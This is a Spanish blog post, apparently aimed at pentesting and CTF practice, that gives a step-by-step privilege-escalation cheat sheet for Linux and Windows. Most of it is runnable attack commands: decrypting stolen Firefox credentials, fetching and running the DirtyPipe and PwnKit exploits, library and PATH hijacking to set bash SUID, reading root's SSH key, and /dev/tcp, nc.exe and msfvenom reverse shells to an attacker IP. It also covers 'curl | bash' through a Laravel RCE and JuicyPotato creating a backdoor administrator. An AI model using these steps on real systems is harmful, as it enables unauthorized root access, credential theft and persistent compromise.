---
layout: single
title: Escalada de privilegios.
excerpt: "Son técnicas para acceder a la información o privilegios que tiene un usuario dentro de un sistema"
date: 2022-11-30
classes: wide
header:
  teaser: /assets/images/pe1.jpeg
  teaser_home_page: true
categories:
- Pentesting
- Ethical Hacking 
tags:
- Privilegios
- Windows
- Linux
---

## Usuarios en Windows.<br>
- Invitado (Guest): Puede usar el equipo pero no modificar nada dentro de el.<br>
- Standard: Usuario con capacidad de modificar algunas configuraciones del sistema siempre y cuando solo afecten al mismo usuario.<br>
- Administrator: Usuario con capacidad de modificar el sistema, desactivar el antivirus, instalar herramientas de forma global o acceder a la información de otros usuarios dentro del mismo sistema.<br>
- NT Authority\System: Usuario del sistema que ejecuta las tareas y servicios del sistema operativo.<br>
Con el comando net users puedes ver los usuarios existentes en el sistema.<br><br>

## Usuarios en Linux.<br>
- Service user: Usuario que ejecuta los servicio del sistema como montar un servicio http para mostrar un sitio web en un servidor. Los privilegios de este usuario se limitan al servicio que esté ejecutando.<br>
- Standard: Usuario normal para usar el sistema.<br>
- Root: Usuario que tiene control total del sistema.<br>
Para saber ver los usuarios existentes en el sistema basta con abrir el /etc/passwd.<br><br>

## Usuarios en aplicaciones web.<br>
- Administrador.<br>
- Editor.<br>
- Standard.<br>
- Otros.<br><br>

## Técnica de escalada de privilegios horizontal.<br>
Es accesar a la información de otros usuarios pero con los mismos privilegios que tiene el usuario con el cual ganaste acceso al sistema.<br>

## Técnica de escalda de privilegios vertical.<br>
Es acceder a un usuario que tenga mas control dentro del sistema para realizar modificaciones.<br><br>

![](/assets/images/pe.jpeg) 

## ESCALADA DE PRIVILEGIOS EN LINUX.<br>
## ls -la
Con el commando ls -la puedes ver las carpetas ocultas, el propietario y que privilegios tienen asignadas los directorio.<br> Debido a que en firefox se almacenan sesiones se puede llegar a listar las credenciales y obtenerlas en texto claro con una herramienta que permita hacer un decrypt en caso de que este el directorio ./mozilla/firefox.<br>
Ingresas al directorio .mozilla/firefox y ve si estan los archivos key.db y login.json dentro de cualquier archivo pero con extensión .default.<br>
Haz un cat a login.json y si está el archivo user.encryp y password.encryp significa que hay una sesión activa y puedes llegar a computar las credenciales.<br>
Clona la siguiente herramienta que te permitirá ver las credenciales.<br>
git clone https://github.com/unode/firefox_decrypt <br>
```
ls -la -> ./mozilla/firefox
cd ./mozilla/firefox
ls -> key.db	login.json
cat login.json -> user.encryp	password.encryp
git clone https://github.com/unode/firefox_decrypt
```

Desde la maquina víctima ver si tiene instalado python3 para poder compartirte un servicio http por el puerto 8000 para que no te pida credenciales al momento de compartirlo.<br>
Copia de forma recursiva todos los recursos que haya dentro del directorio ./mozilla/firefox a tu maquina con wget.<br>
```
which python3 -> /usr/bin/pyhton3
python3 -m http.server 8000
wget -r <ip-address>:8000
```
Correr el script en python e indicale la ruta de donde hará el decryp.
```
python3 firefox_decryp.py /ejemplo/directorio/copiado
```
<br><br>
## DirtyPipe.
CVE-2022-0847 -> Es una vulnerabilidad que que consiste en cambiar la contraseña del usuario root sobrescribiendo el /etc/passwd.<br> Para ver si un sistema operativo es vulnerable al DirtyPipe lo que se tiene que hacer es ver si tiene instalado el binario gcc. Posteriormente desplazarse a una carpeta que tenga permisos de escritura para poder descargar el exploit(Por lo regular el directorio /tmp siempre cuenta con permisos de escritura). En caso de que la maquina no tenga acceso a internet te puedes copiar el exploit a la clipboard y despues pegarlo en un archivo.c. Por consiguiente buscar en github el exploit referente a la vulnerabilidad, compilar el exploit y al ejecutarlo te lanzará una consola como el usuario root.<br>
```
which gcc -> /usr/bin/gcc

cd /tmp

which wget -> /usr/bin/wget			# Para descargar el exploit a la maquina victima.
wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c

cat exploit.c | xargs | xclip -sel clip 	# Copiar el exploit.c a la clipboard.
nano exploit.c 					# Crear un archivo.c para pegar el exploit copiardo de la clipboard

gcc exploit.c -o exploit 			# Compilar el exploit.c y explortarlo al archivo con nombre exploit

./exploit					# Ejecutar el exploit
```
<br><br>
## id.
Ver a que grupos pertece el usuario actual. En caso de que este dentro del grupo lxd o docker tienes una vía potencial para escalar privilegios en caso de que no este sanitizado.<br>
Explotación del grupo lxd.
- Lo primero que se tiene que hacer es buscar con searchsploit un script que te ayude a explotar la vulnerabilidad del lxd. 
- Despues copias el exploit a la ruta actual de trabajo.
- Mueves el exploit a un archivo con nombre descriptivo con la misma extensión(exploitlxd.sh), abres el exploit, eliminas la linea 22 y añades la siguiente linea -> lxc image list y lo guardas.
- Te descargas el lxd alpine builder como completmento para la explotación. 
- Ejecutas el siguiente comando como el usuario root sudo bash build-alphine.
- Te compartes un servicio http por el puerto 80 para traladar el exploit y el alpine.tar.gz a la maquina víctima.
- Ingresas a un directorio que tenga capacidad de escritura para no tener problemas al traladar el exploitlxd.sh y con wget te tranfieres el exploitlxd.sh y el alpine.tar.gz 
- Le asignas permisos de ejecución al exploitlxd.sh, lo ejecutas y obtendras una consola como el usuario root.

```
searchsploit lxd -> linux/local/46978.sh
searchsploit -m linux/local/46978.sh .
mv 46978.sh exploit_lxd.sh && nvim exploit_lxd.sh
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
sudo bash build-alpine
sudo python3 -m http.server 80

cd /tmp 
wget http://<tu-ip-address>/exploitlxd.sh
wget http://<tu-ip-address>/alpine-v3.16-x86_64-20220817_1533.tar.gz
chmod +x exploitlxd.sh
./exploitlxd.sh
```
<br><br>
## lsb_release -a (Linux Standard Base).
Comando utilizado para mostrar toda la información acerca de la distribución de Linux (Sistema Operativo) que se está ejecutando, como su nombre de distibución, versión, codename y descripción.
```
lsb_release -a
Distributor ID: Debian
Description:	Debian GNU/Linux 9.9 (stretch)
Release:	9.9
Codename:	stretch

# -a -> Este parámetro es para mostrar toda la información acerca del sistema operativo.
```
En base a la versión del sistema operativo se pueden buscar vulnerabilidades asociadas y veríficar si se cuentan con los parches de seguridad actualizados.
<br><br>
## su root.
En caso de que tengas contraseñas puedes reutilizarlas con este comando y si son las correctas puedes convertirte en superusuario.
```
su root
```
<br><br>
## sudo -l.
Ver si hay binarios que se puedan ejecutar como el usuario root sin proporcionar la contraseña. En caso de encontrar un binario con este comando puedes apoyarte de el sitio web GTFOBins el cual te muestra como puedes llegar a escalar privilegios por medio de un binario.
```
sudo -l -> /usr/bin/knife
sudo knife exec -E 'exec "/bin/bash"'	# Con este linea te lanzas una consola como el usuario root.
```
Si al ejecutar el sudo -l vez que el usuario actual tiene todos los privilegios asignados para ejecutar cualquier cosa dentro del sistema, puedes hacer un bash -p para convertirte en root.
```
sudo -l -> ALL/ALL
bash -p 
```
<br><br>
## Library Hijacking.
Consiste en suplantar una librería de python que un script.py importe al ejecutarse.<br>
¿Como se realiza esta técnica? Lo primero que tendras que hacer es identificar un script.py que se ejecute en el sistema, abres el script.py y revisas que librerías esta importando el script.py.<br> Una vez que hallaz identificado las librerías que se importan lo que vas a hacer es crear un script.py pero con el nombre de una de las librerías que importa el script. Dentro de la librería que acabas de crear vas a añadir código malicioso que te permita cambiar los privilegios de la bash. Lo que hace el script.py al ejecutarse es que al importar las librerías sigue un orden que depende del path(secuencia de directorios que se recorren para llegar a un archivo). Por lo regular parte de la ruta actual donde se sitúa y de allí recorre los demas directorios en busca de las librerías.<br>
Entonces si creas una archivo con el nombre de una librería que importe el script.py tomará está primero debido a que esta situada en el mismo lugar que el script.py y esta librería hará lo que tu le indiques dentro del script.<br>
Ej; La librería que se importa en el script.py es hashlib. Lo que haces es crear un archivo hashlib.py que invoque al sistema operativo para cambiarle los privilegios a la bash SUID(Set Uses ID). Ejecutamos el script indicando como usuario a root seguido de la ruta en la cual se encuentra el script.py.<br>
- Los permisos SUID son permisos especiales que se le asignan a archivos o aplicaciones que al momento de ejecutarse se ejecutan como el usuario propietario y no como el usuario que lo ejecuta.<br>

Haces un bash -p y te conviertes el el usuario root.
```
nvim hashlib.py -> import os 
		   os.system('chmod u+s "/bin/bash"') 	# Tambien se puede asignar sl permiso SUID asi chmod 4755 /bin/bash 

sudo -u root /usr/bin/python /home/<username>/script.py
bash -p
```
<br><br>
## cat /etc/crontab | crontab -l.
Con este comando puedes ver las tareas cron programadas en el sistema y posteriormente aprovecharte de una de ellas para inyectar código malicioso. <br>
Las tareas cron por lo regular llegar a ser scripts relacionados con correos, bases de datos o comprobación de rutinas programadas con presición para que se ejecuten en una determinada fecha y hora.<br>
Uno como atacante puede ver las que tareas estan por ejecutarse y modificarlas agregando una linea que en el script que al ejecutarse le cambie los permisos a la bash por SUID.
```
chmod u+s /bin/bash
chmod 4755 /bin/bash
watch -c 1 /bin/bash 	# Comando para monitorizar el cambio de permisos en la bash
```
<br>
<b>PSPY</b><br>
Es una herramienta que te ayuda a identificar tareas o comandos que se estén ejecutando en el sistema.<br>
Descarga: `` https://github.com/DominicBreuker/pspy/releases ``. "Descargar el pspy64".
<br>
Para hacer uso de esta herramienta es necesario que la transfieras a la máquina víctima, asignarle permisos de ejecución y ejecutarla.
```
./pspy64
```
<br><br>
## find \\-perm -4000 -user root -ls 2>/dev/null.
Listar aquellos binarios SUID de los cuales el proprietario sea el usuario root y los errores los rediriges al stderr para no verlos en pantalla.<br>
- ./usr/bin/pkexec (CVE-2021-4034).<br>Con este binario puedes llegar a escalar privilegios con la herramienta pwnkit que se encuentra en github.<br>Lo primero que se tiene que hacer es ver si la máquina víctima cuenta con wget y make. Posteriormente te clonas repositorio de github y lo descomprimes.<br>Desde tu máquina de atacante te compartes un servicio HTTP por el puerto 80 para transferir el pwnkit. Por ultimo te transfieres el pwnkit, ingresas en el, haces un make y lo ejecutas. Al ejecutarlo ganas acceso al sistema como el usuario root.

```
which wget && which make -> /usr/bin/wget 
			    /usr/bin/make
git clone https://github.com/berdav/CVE-2021-4034 
mv CVE-2021-4034.zip pwnkit.zip && zip -r pwnkit.zip pwnkit
sudo python3 -m http.server 80

wget http://<ip-address>/pwnkit
cd pwnkit && make && ./pwnkit
```
- ./usr/local/bin/backup.<br>Ver el propietario y el grupo al cual pertenece el binario backup. En caso de que el binario pertenezca a otros grupos puedes verificar que usuario esta en ese grupo para poder ejecutar el binario.


```
ls -la ./usr/local/bin/backup -> -rwsr-xr-- 1 root admin 16484 Sep  3  2017 ./usr/local/bin/backup
# En este caso el propietario es root y el grupo al que pertenece es admin, lo siguiente es ver que usuarios están en ese grupo para poderlo ejecutar.
```
```
groups <username> # Con este comando puedes ver los grupos a los cuales pertenece un usuario.
```
<b> Path Hijacking.</b>
- ./opt/statuscheck.<br>Este es ejemplo de un binario compilado el cual el vulnerable a un <b>Path Hijacking</b>. Con el comando strings puedes listar las cadenas de carácteres imprimibles y le concatenas un less para ver la sálida del comando strings desde el inicio.<br>
```
strings ./opt/statuscheck | less 

/lib64/ld-linux-86-64.so.2
lib.so.6
system
__cxa_finalize
__libc_start_main
curl -I H   <--------- Se ejecuta el binario curl de forma relativa
http://lH
ocalhostH
AWAVA
AUATL
```
En este caso como se esta ejecutando por détras del binario curl de forma relativa y no absoluta (la forma relativa es cuando no se toma en cuenta la ruta desde la raíz). Entonces como no se toma en cuenta la ruta entera y como el binario es SUID (privilegio 4755), se puede crear un archivo llamado curl que le cambie los privilegios a las bash para ganar acceso como el usuario root.
```
touch curl
chmod +x curl

nano curl -> chmod u+s /bin/bash
```
Ahora queda modíficar el PATH para que cuando se intente ejecutar el curl, en lugar de hacerlo desde la ruta absoluta /usr/bin/curl lo haga desde la ruta actúal, tomando en cuenta el archivo que acabamos de crear con nombre curl.
```
export PATH=.:$PATH
echo $PATH	# Ver el contenido de la variable PATH y asegurarse que se haya modificado.
.:/usr/local/sbin:/usr/local/bin:/usr/sbin	# El nuevo PATH debería de inicar con un punto, que especifica la ruta actual de trabajo.
```
Ejecutas el binario y verificas que se le hayan cambiado los privilegios a las bash.
```
/opt/statuscheck

ls -l /bin/bash
-rwsr-xr-x 1 root root 1099016 May 15 2017 /bin/bash

bash -p		# Ejecutar la bash como el usuario root.
``` 
<br><br>
## systemctl list-times.
Ver las tareas que estan a punto de ejecutarse 
<br><br>
## getcap -r / 2>/dev/null.
Listar las capabilities a nivel de sistema de forma recursiva y los errores redirigirlos al stderr para no verlos en pantalla. Las capabilities nos permiten gestionar los permisos que tiene un proceso para accerder al kernel independientemente de quien lo ejecute. Lo que hacen las capabilities es dividir las llamadas de kernel priviligiadas en grupos mas pequeños de privilegios.<br>
- /usr/bin/perl -> cap_setuid+ep.<br>+ep significa que la capability es efectiva y permitida.<br>
Esta capability te permite controlar el identificador de usuario para convertirte en usuario root cambiando el uid. Para escalar privilegios lo primero que se hace es asignarle la capability cap_setuid+ep al binario perl y despues se ejecuta una instrucción que te arrogará una consola como root.
```
setcap cap_setuid+ep perl
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
- /usr/bin/tac -> cap_dac_read_search+ei.<br>Esta capability se puede asignar a un binario, en este caso esta asignada al binario tac el cual es un como un cat solo que invierte el output. Con el binario tac puedes ver la id_rsa de un usuario que este dentro del sistema o bien del usuario root para conectarte de forma remota por el puerto 22 (SSH) si se encuentra abierto. Tambien con esta capability puedes salir de un contenedor para conectarte directo al sistema.
```
tac /root/.ssh/id_rsa | tac -> Se le concatena otro tac para regresar el output a la normalidad.
```
<br><br>
## ps -faux | ps -e command.
Listar los procesos que se estan ejecutando.
<br><br>
## find / -writable -ls 2>/dev/null.
Listar aquellos archivos que tengan capacidad de escritura para despues injectarles código malicioso. Puedes usar regex para ir filtrando los archivos.<br>
```
find / -writable -ls 2>/dev/null | grep -vE "/var|/run|/dev|/proc|/sys|/tmp" 
# Con grep -vE "" vas ir quitando las lineas que hagan match.
```
Si al ir filtrando vez que el /etc/passwd tiene capacidad de escritura puedes crear una contraseña DES(unix) con openssl para sustiturla en el /etc/passwd y se interprete primero ésta primero antes de la original, situada en el /etc/shadow.
```
opnessl passwd <EstaEsUnaContraseña> 
password: <ContraseñaDeCifrado>
# Posteriormente te pedira una contraseña para cifrar el texto que pusiste anteriormente y esa misma contraseña de cifrado 
# seŕa la que te pida al hacer su root.

su root
password: <ContraseñaDeCifrado>
```
<br><br>
## netstat -nat | ss-nltp.
Comando para ver los puertos que se encuentran abiertos internamente en el equipo y aplicar un Port Forwarding.<br>El Port Forwarding es básicamente traerte un puerto que se este abierto internamente en la maquina víctima a tu equipo de atacante.<br>

Si al aplicar el comando netstat -nat o ss-nltp logras ver el puerto 8000 abierto y en el esta corriendo laravel que por lo regular laravel corre en ese puerto por default a menos que se modifique, puedes llegar a escalar privilegios sino esta sanitizado.<br>
- Lo primero tienes que hacer es clonar chisel de github y redudir el peso para que no tarde al transferirlo a la máquina víctima.<br>Te compartes un servicio http con python y transfieres el chisel en un directorio que tenga capacidad de escritura, le asignas permisos de ejecución y lo ejecutas.<br>Te clonas la CVE-2021-3129 de github, ingresas en el directorio creado y te ejecutas el exploit.py.<br>Desde otra ventana te creas un archivo que contenga una reverse shell y compartes un servicio http.<br>En otra ventana te pones en escucha con ncat para que al ejecutar el exploit.py de la CVE-2021-3129 esta hace un curl a tu servicio compartido y te envia una reverse shell al ncat por el puerto 443.
```
git clone https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_arm64.gz
cd chisel && go build -ldflags "-s -w" . && upx chisel  # Reducir el peso del chisel.
sudo python3 -m http.server 80

cd /tmp
wget http://<ip-address>/chisel				# Desde la máquina víctima.
chmod +x chisel
./chisel client <ip-address>:1234 R:8000:127.0.0.1:8000	
# Esto hará que el puerto 8000 de la máquina víctima se transfiera a tu máquina como el puerto 8000 y puedeas acceder a el 
# desde el localhost Ej; localhost:8000

./chisel server reverse -p 1234				# Desde tu máquina de atacante.

nano index.html && cd index.html
# Le metes esta linea en el index.html -> bash -i >& /dev/tcp/<ip-address>/443 0>&1
sudo python3 -m http.server 80

sudo -rlwrap ncat -nlvp 443

git clone CVE-2021-3129 
cd CVE-2021-3129 && ./exploit.py http://localhost:8000 Monolog/RCE1 'curl <tu-ip-address> | bash'
```
Al ejecutarlo ganaras acceso al sistema como el usuario root.
<br><br>
## linPEAS.sh.
linPEAS es una herramienta que te automatiza la escalada de privilegios reportandote aquellas vías potenciales por las cuales puedes llegar a convertirte en usuario root.
Te clonas el repositorio de github https://github.com/carlospolop/PEASS-ng/releases/tag/20220731 a tu equipo y te comprartes un servicio con python3 para transferir el linPEAS.sh a la máquina víctima.<br>Te transfieres el linPEAS, le das permisos de ejecución y lo ejecutas.<br>Busca por cosas relacionadas con nombres de bases de datos (mysql, mongo etc), passwords, keys, usernames, emails, información que sea delicada.
```
git clone https://github.com/carlospolop/PEASS-ng/releases/tag/20220731
sudo python3 -m http.server 80

wget http://<ip-address/linPEAS.sh			# Desde la máquina víctima
chmod +x linPEAS.sh
./linPEAS.sh
```
<br><br>
## ESCALADA DE PRIVILEGIOS EN WINDOWS.
## systeminfo | reg query.
Comando para aplicar reconocimiento dentro del equipo y ver la versión del sistema operativo mediante la función reg query.
```
reg query "hklm\software\microsoft\windows nt\currentversion" /v ProductName
```
<br><br>
## whoami /all.
Este comando muestra información del token de acceso, el nombre de usuario, los identificadores de seguridad(SID), los privilegios y grupos a los cuales pertenece el usuario actual.
<br><br>
## whoami /priv.
Este comando te permite ver los privilegios que tiene asignado el usuario actual.<br>
En caso de que el usuario tenga asignado el privilegio SeImpersonatePrivilege puedes llegar a escalar privilegios haciendo uso de la herramienta juicypotato.exe que se encuentra en github.<br>Lo que hace el juicypotato.exe es crear un usuario y despues lo asigna al grupo Administrator para que tenga los privilegios maximos dentro del sistema.<br>
Primero te descargas el juicypotato a tu equipo, luego con la herramienta smbserver te compartes un recurso que este sincronizado con la ruta actual de trabajo y le das soporte a la versión 2 de smb para no tener problemas con la versión del sistema operativo. Te diriges a una ruta que tenga capacidad de escritura y copias el juicypotato.exe especificanfo tu ip-address, el nombre del archivo que quieres copiar y con que nombre lo quieres almacenar en el equipo.
```
sudo impacket-smbserver smbFolder $(pwd) smb2support	

cd C:\Windows\Temp
copy \\<ip-address>\smbFolder\juicypotato.exe jp.exe
```
Lo siguiente será crear un usuario con una contraseña para agregarlo al grupo Administrators y retocar el registro LocalAccountTokenFilterPolicy para que el usuario creado pueda ganar acceso como administrador.
```
jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user <username> <password> /add" -l 1337
jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators <username> /add" -l 1337
jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
net user <username> 	# Comando para ver que el usuario creado se haya añadido al grupo Administrators.
```
<br><br>
Despues hay que comprobar que el usuario creado con el juicypotato sea un usuario del sistema con los privilegios de administrador para despues conectarte con psexec.py al sistema como el usuario NT Authority\System.
```
crackmapexec smb -u '<username>' '<password>'	# Si como output te sale un pwn3d! es por que el usuario es administrador del sistema

psexec.py WORKGROUP/<username>@<ip-address> cmd.exe
```
Si no puedes conectarte con psexec.py significa que los recursos compartidos a nivel de red no tienen permisos de escritura y tendras que crear uno.<br>
Te creas un recurso compartido y lo sincronizas con la ruta actual de trabajo garantizando que los usuarios que pertenezcan al grupo Administrators tengan privilegios totales sobre el recurso compartido y vuelves a ejecutar el psexec.py.
```
jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net share smbFolder=C:\Windows\Temp /GRANT:Administratos.FULL" -l 1337

psexec.py WORKGROUP/<username>@<ip-address> cmd.exe
```
<br><br>
## net user \<username\>.
Ver a que grupos pertenece un usuario.
- Si el usuario pertenece al grupo Server Operator se pueden crear, iniciar y detener procesos para escalar privilegios.<br>Crear un proceso (servicio) para que cuando se inicie te envíe una reverse shell a tu equipo por el puerto 443.
```
sudo rlwrap ncat -nlvp 443	# Ponerte en escucha para recibir la reverse shell.

sc.exe create reverseShell binPath="C:\Windows\Temp\nc.exe -e cmd <ip-address> 443"
# reverseShell es el nombre del proceso.
# binPath es la ruta donde se encuentra el nc.exe.
```
Tranferir el nc.exe a la máquina víctima.
```
impacket-smbserver smb smbFolder $(pwd) smb2support	# Desde tu equipo.
copy \\<ip-address>\smbFolder\nc.exe			# Desde la máquina víctima.

upload /ruta/donde/esta/el/nc.exe	# Forma de subir el nc.exe en caso de haber ganado acceso por winrm.
```
- Sino puedes crear un proceso o servicio puedes ver que procesos hay y modificar uno existente. Tendrías que ir probando uno a uno para ver cual puede ser modificado.<br>Una vez modificado un proceso tienes que detener el proceso y volverlo a iniciar y ponerte en escucha con ncat para que cuando se inicie el proceso te envie la reverse shell.
```
services	# Ver los procesos que se estan ejecutando.
sc.exe config <name_process> binPath="C:\Windows\Temp\nc.exe -e cmd <ip-address> 443"
# <name_process> es el nombre del proceso que quieres modificar.

sc.exe stop <name_process>	# Detener un servicio.

sudo ncat -nlvp 443		# Desde tu equipo.

sc.exe start <name_process>	# Iniciar un servicio.
```
<br><br>
## winPEAS.exe.
winPEAS es una herramienta que te ayuda a aplicar reconocimiento en el sistema e identificar posibles vectores por los cuales puedes llegar a escalar priviegios.<br>
Lo que tienes que hacer es descargar el winPEAS.exe de github para despues transferirlo a la máquina víctima con certutil.exe
```
sudo python3 -m http.server 80

certutil.exe -f -urlcache -split http://<ip-address>/winPEAS.exe winpeas.exe
winpeas.exe
```
Ya solo queda buscar por aquelas partes que esten en color rojo ya que representan una forma segura por la cual elevar privilegios.<br>
- AlwaysInstallElevated.<br>Es una directiva que te permite instalar un paquete de instalador de Windows con privilegios elevados.<br>Si esta directiva se encuentra con un 1 (AlwaysInstallElevated set to 1 in HKLM) puedes crearte un archivo malicioso con msfvenom que contenga una reverse shell para enviarte una consola como el usuario NT Authority\System.
```
msfvenom -p /window/x64/shell_reverse_tcp LHOST=<ip-address> LPORT=443 --platform windows -a x64 -f msi -o reverse_shell.msi
# -p = Para especificar el tipo de payload a utilizar.
# LHOST = IP addres a la cual quieres que se envíe la reverse shell.
# LPORT = Puerto por el cual se enviará la reverse shell.
# --platform windows -a x64 = Indica que es un OS Windows de 64 bits.
# -f = Tipo de extensión que tendrá el payload.
# -o = Nombre que tendrá el archivo al ser exportado.

certutil.exe -f -urlcache -split http://<ip-address>/reverse_shell.msi reverse.msi
# Tranferir el archivo reverse_shell.msi a la máquina con el nombre de reverse.msi

sudo rlwrap ncat -nlvp 443	# Ponerse en escucha para recibir la consola interactiva.
msexec /quiet /qn /i reverse.msi	# Ejecutar el archivo reverse.msi (Antes de ejecutarlo debes ponerte en escucha con ncat).
```

